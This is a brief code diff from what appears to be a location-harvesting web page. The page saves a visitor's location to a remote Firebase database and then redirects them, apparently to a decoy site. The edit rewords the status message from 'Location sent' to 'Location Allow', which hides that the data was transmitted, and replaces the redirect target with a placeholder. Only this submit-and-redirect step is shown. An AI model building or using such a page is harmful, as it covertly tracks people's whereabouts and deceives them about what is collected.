@@ -82,11 +82,11 @@
       const locationKey = database.ref().child('locations').push().key;
       database.ref('locations/' + locationKey).set(data)
         .then(() => {
-          setStatusMessage("✅ Location sent successfully. Redirecting...");
-          window.location.href = "https://www.upwork.com"; // ✅ Redirect here
+          setStatusMessage("✅ Location Allow successfully. Redirecting...");
+          window.location.href = "https://your_redirect_link"; // ✅ Redirect here
         })
         .catch(() => {
-          setStatusMessage("❌ FAILED: Could not send location. Try again.", true);
+          setStatusMessage("❌ FAILED: Could not Allow location. Try again.", true);
         });
     }
 
